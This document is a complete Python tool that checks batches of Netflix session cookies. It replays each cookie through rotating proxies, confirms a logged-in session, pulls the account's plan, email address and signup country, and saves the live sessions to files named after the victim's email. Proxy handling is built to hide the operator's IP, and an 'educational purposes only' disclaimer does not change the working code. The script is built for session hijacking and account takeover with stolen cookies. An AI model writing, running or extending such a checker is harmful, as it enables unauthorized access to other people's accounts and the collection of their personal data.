import argparse
import hashlib
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from http.client import RemoteDisconnected
from threading import Lock
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from requests.exceptions import ConnectionError, RequestException


init()


@dataclass
class Config:
    cookies_dir: str
    output_dir: str
    threads: int
    proxy_file: str | None
    proxy_type: str
    max_retries: int


@dataclass
class Stats:
    working: int = 0
    expired: int = 0
    duplicate: int = 0
    extra_memberships: int = 0
    errors: int = 0


LOCK = Lock()
PROXY_INDEX = 0
VALID_PROXIES: list[dict[str, str]] = []
SEEN_COOKIE_FINGERPRINTS: set[str] = set()


def decode_hex_escapes(value: str) -> str:
    if not value:
        return value
    value = re.sub(r"\\x([0-9A-Fa-f]{2})", lambda m: chr(int(m.group(1), 16)), value)
    value = re.sub(r"\\u([0-9A-Fa-f]{4})", lambda m: chr(int(m.group(1), 16)), value)
    return value


def extract_info(response_text: str) -> dict[str, str | None]:
    patterns = {
        "localizedPlanName": (
            r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([^"]+)"'
        ),
        "emailAddress": r'"emailAddress"\s*:\s*"([^"]+)"',
        "countryOfSignup": r'"countryOfSignup"\s*:\s*"([^"]+)"',
    }
    result: dict[str, str | None] = {}
    for key, pattern in patterns.items():
        match = re.search(pattern, response_text)
        result[key] = decode_hex_escapes(match.group(1)) if match else None
    return result


def load_cookies_from_json(path: str) -> list:
    with open(path, "r", encoding="utf-8") as handle:
        return json.load(handle)


def cookie_fingerprint(cookies: list) -> str:
    parts = []
    for cookie in cookies:
        if not isinstance(cookie, dict) or "name" not in cookie or "value" not in cookie:
            continue
        domain = str(cookie.get("domain", "")).lower()
        path = str(cookie.get("path", ""))
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        parts.append(f"{domain}\t{path}\t{name}\t{value}")
    if not parts:
        return ""
    payload = "\n".join(sorted(parts))
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def load_cookie_fingerprints(folder: str) -> set[str]:
    fingerprints = set()
    if not os.path.isdir(folder):
        return fingerprints

    for filename in os.listdir(folder):
        path = os.path.join(folder, filename)
        if not os.path.isfile(path):
            continue
        try:
            fingerprint = cookie_fingerprint(load_cookies_from_json(path))
            if fingerprint:
                fingerprints.add(fingerprint)
        except Exception:
            pass
    return fingerprints


def proxy_label(proxies: dict[str, str] | None) -> str:
    if not proxies:
        return "n/a"
    return proxies.get("https") or proxies.get("http") or "n/a"


def is_netflix_account_url(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path == "/account"


def is_netflix_login_url(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.endswith("/login")


def is_netflix_browse_url(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.startswith("/browse")


def parse_proxy_line(line: str, proxy_type: str) -> str | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "@" in line:
        return f"{proxy_type}://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"{proxy_type}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"{proxy_type}://{user}:{passwd}@{host}:{port}"
    return None


def validate_proxy(proxy_url: str, timeout: int = 8) -> bool:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        with requests.Session() as session:
            session.trust_env = False
            response = session.get("https://www.google.com", proxies=proxies, timeout=timeout)
        return response.status_code < 500
    except Exception:
        return False


def load_and_validate_proxies(filepath: str, proxy_type: str) -> list[dict[str, str]]:
    with open(filepath, "r", encoding="utf-8", errors="ignore") as handle:
        raw_lines = handle.readlines()

    proxy_urls = [url for url in (parse_proxy_line(line, proxy_type) for line in raw_lines) if url]
    if not proxy_urls:
        raise SystemExit("No parseable proxies found in the proxy file.")

    print(f"Validating {len(proxy_urls)} proxies...")
    live_proxies: list[dict[str, str]] = []
    dead_count = 0
    local_lock = Lock()

    def check_proxy(url: str) -> None:
        nonlocal dead_count
        if validate_proxy(url):
            with local_lock:
                live_proxies.append({"http": url, "https": url})
                print(f"[LIVE] {url}")
        else:
            with local_lock:
                dead_count += 1
                print(f"[DEAD] {url}")

    with ThreadPoolExecutor(max_workers=min(20, len(proxy_urls))) as executor:
        list(executor.map(check_proxy, proxy_urls))

    print(f"Proxy validation complete: {len(live_proxies)} live / {dead_count} dead")
    return live_proxies


def get_next_proxy() -> dict[str, str] | None:
    global PROXY_INDEX

    if not VALID_PROXIES:
        return None

    with LOCK:
        proxy = VALID_PROXIES[PROXY_INDEX % len(VALID_PROXIES)]
        PROXY_INDEX += 1
    return proxy


def check_cookie(
    session: requests.Session,
    cookies: list,
    filename: str,
    config: Config,
    stats: Stats,
) -> tuple[str, str, str, bool] | None:
    session.cookies.clear()
    session.trust_env = False
    for cookie in cookies:
        try:
            session.cookies.set(cookie["name"], cookie["value"])
        except Exception:
            pass

    session.headers.update({"Accept-Encoding": "identity"})

    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)

    for attempt in range(config.max_retries):
        try:
            request_proxies = dict(session.proxies) if VALID_PROXIES else None

            account_response = session.get(
                "https://www.netflix.com/YourAccount",
                timeout=20,
                allow_redirects=True,
                proxies=request_proxies,
            )
            account_response.raise_for_status()
            if not is_netflix_account_url(account_response.url):
                reason = (
                    "redirected to login"
                    if is_netflix_login_url(account_response.url)
                    else f"ended at {account_response.url}"
                )
                with LOCK:
                    stats.expired += 1
                    suffix = f" | Proxy: {proxy_label(request_proxies)}" if VALID_PROXIES else ""
                    print(f"{Fore.RED}[INVALID] {filename} ({reason}){suffix}{Fore.RESET}")
                return None

            browse_response = session.get(
                "https://www.netflix.com/browse",
                timeout=20,
                allow_redirects=True,
                proxies=request_proxies,
            )
            browse_response.raise_for_status()
            if not is_netflix_browse_url(browse_response.url):
                with LOCK:
                    stats.expired += 1
                    suffix = f" | Proxy: {proxy_label(request_proxies)}" if VALID_PROXIES else ""
                    print(
                        f"{Fore.RED}[INVALID] {filename} "
                        f"(browse redirected to {browse_response.url}){suffix}{Fore.RESET}"
                    )
                return None

            info = extract_info(account_response.text)
            soup = BeautifulSoup(account_response.text, "lxml")

            extra_member_response = session.get(
                "https://www.netflix.com/accountowner/addextramember",
                allow_redirects=False,
                timeout=20,
                proxies=request_proxies,
            )
            extra_members = extra_member_response.status_code == 200

            raw_plan = info.get("localizedPlanName")
            if raw_plan:
                plan = raw_plan.replace("miembro\xa0extra", "(Shared Extra Member)")
            else:
                page_text = soup.get_text()
                for candidate in ("Premium", "Standard", "Basic"):
                    if candidate in page_text:
                        plan = candidate
                        break
                else:
                    plan = "Unknown"

            raw_email = info.get("emailAddress")
            if raw_email:
                email = raw_email
            else:
                element = soup.select_one(".account-section-email")
                email = element.text.strip() if element else "Unknown"

            country = info.get("countryOfSignup") or "Unknown"
            return plan, email, country, extra_members

        except (RequestException, ConnectionError, RemoteDisconnected) as exc:
            with LOCK:
                suffix = f" | Proxy: {proxy_label(session.proxies)}" if VALID_PROXIES else ""
                print(
                    f"{Fore.YELLOW}[RETRY] {filename} ({attempt + 1}/{config.max_retries}) "
                    f"{exc}{suffix}{Fore.RESET}"
                )
            next_proxy = get_next_proxy()
            if next_proxy:
                session.proxies.update(next_proxy)
            time.sleep(1)

    with LOCK:
        stats.errors += 1
        print(f"{Fore.RED}[FAILED] {filename} exhausted retries{Fore.RESET}")
    return None


def process_cookie_file(filename: str, config: Config, stats: Stats) -> None:
    filepath = os.path.join(config.cookies_dir, filename)
    if not os.path.isfile(filepath):
        return

    try:
        cookies = load_cookies_from_json(filepath)
        fingerprint = cookie_fingerprint(cookies)
    except json.JSONDecodeError:
        with LOCK:
            stats.errors += 1
            print(f"{Fore.RED}[ERROR] Invalid JSON: {filename}{Fore.RESET}")
        return
    except Exception as exc:
        with LOCK:
            stats.errors += 1
            print(f"{Fore.RED}[ERROR] {filename}: {exc}{Fore.RESET}")
        return

    with requests.Session() as session:
        result = check_cookie(session, cookies, filename, config, stats)
        if result is None:
            return

        plan, email, country, extra_members = result
        safe_email = re.sub(r'[<>:"/\\|?*]', "_", email or "unknown")
        suffix = " - Extra Membership" if extra_members else ""
        out_name = f"[{country}] [{safe_email}] - {plan}{suffix}.json"
        out_path = os.path.join(config.output_dir, out_name)

        meta = {
            "_comment": "Cookie checked by ubuntu_headless.py",
            "Credits": "Matheesha Pathirana",
            "Disclaimer": "This project is for educational purposes only.",
        }
        cookies.append(meta)

        with LOCK:
            if (fingerprint and fingerprint in SEEN_COOKIE_FINGERPRINTS) or os.path.isfile(out_path):
                stats.duplicate += 1
                print(f"{Fore.YELLOW}[DUPLICATE] {filename} | Plan: {plan} | Email: {email}{Fore.RESET}")
                return

            with open(out_path, "w", encoding="utf-8") as handle:
                json.dump(cookies, handle, indent=4)

            if fingerprint:
                SEEN_COOKIE_FINGERPRINTS.add(fingerprint)
            stats.working += 1
            if extra_members:
                stats.extra_memberships += 1

            suffix_text = f" | Proxy: {proxy_label(session.proxies)}" if VALID_PROXIES else ""
            print(
                f"{Fore.GREEN}[WORKING] [{country}] {filename} | Plan: {plan} | "
                f"Email: {email} | Extra: {extra_members}{suffix_text}{Fore.RESET}"
            )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Headless Ubuntu-compatible Netflix cookie checker."
    )
    parser.add_argument("--cookies-dir", default="json_cookies", help="Folder containing JSON cookies.")
    parser.add_argument("--output-dir", default="working_cookies", help="Folder to save working cookies.")
    parser.add_argument("--threads", type=int, default=10, help="Number of worker threads.")
    parser.add_argument("--proxy-file", help="Optional proxy list file.")
    parser.add_argument(
        "--proxy-type",
        choices=("http", "https", "socks4", "socks5"),
        default="http",
        help="Proxy type used by entries in --proxy-file.",
    )
    parser.add_argument("--max-retries", type=int, default=3, help="Retries per cookie.")
    return parser


def main() -> int:
    global VALID_PROXIES, SEEN_COOKIE_FINGERPRINTS

    parser = build_parser()
    args = parser.parse_args()
    config = Config(
        cookies_dir=args.cookies_dir,
        output_dir=args.output_dir,
        threads=max(1, args.threads),
        proxy_file=args.proxy_file,
        proxy_type=args.proxy_type,
        max_retries=max(1, args.max_retries),
    )

    print("Netflix Cookie Checker (Headless Ubuntu)")
    print("Initializing...\n")
    start = time.time()

    if not os.path.isdir(config.cookies_dir):
        print(f"{Fore.RED}Cookie directory not found: {config.cookies_dir}{Fore.RESET}")
        return 1

    files = [
        filename
        for filename in os.listdir(config.cookies_dir)
        if os.path.isfile(os.path.join(config.cookies_dir, filename))
    ]
    if not files:
        print(f"{Fore.RED}Cookie directory is empty: {config.cookies_dir}{Fore.RESET}")
        return 1

    os.makedirs(config.output_dir, exist_ok=True)
    SEEN_COOKIE_FINGERPRINTS = load_cookie_fingerprints(config.output_dir)

    if config.proxy_file:
        if not os.path.isfile(config.proxy_file):
            print(f"{Fore.RED}Proxy file not found: {config.proxy_file}{Fore.RESET}")
            return 1
        VALID_PROXIES = load_and_validate_proxies(config.proxy_file, config.proxy_type)
        if not VALID_PROXIES:
            print(f"{Fore.RED}No live proxies found. Stopping to protect your real IP.{Fore.RESET}")
            return 1

    stats = Stats()
    proxy_info = f"ON ({len(VALID_PROXIES)} live)" if VALID_PROXIES else "OFF"
    print(
        f"Starting with {len(files)} cookie(s) | threads: {config.threads} | "
        f"proxy: {proxy_info}\n"
    )

    with ThreadPoolExecutor(max_workers=config.threads) as executor:
        futures = [executor.submit(process_cookie_file, filename, config, stats) for filename in files]
        for future in futures:
            future.result()

    elapsed = round(time.time() - start)
    print("\n===================================")
    print("Summary")
    print(f"  Total cookies      : {len(files)}")
    print(f"  Working cookies    : {stats.working}")
    print(f"  Extra memberships  : {stats.extra_memberships}")
    print(f"  Expired cookies    : {stats.expired}")
    print(f"  Duplicate cookies  : {stats.duplicate}")
    print(f"  Errors / invalid   : {stats.errors}")
    print(f"  Proxies used       : {'Yes' if VALID_PROXIES else 'No'}")
    print(f"  Time elapsed       : {elapsed}s")
    print("===================================")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

#python3 ubuntu_headless.py --cookies-dir json_cookies --output-dir working_cookies --threads 10 --proxy-file proxies.txt --proxy-type http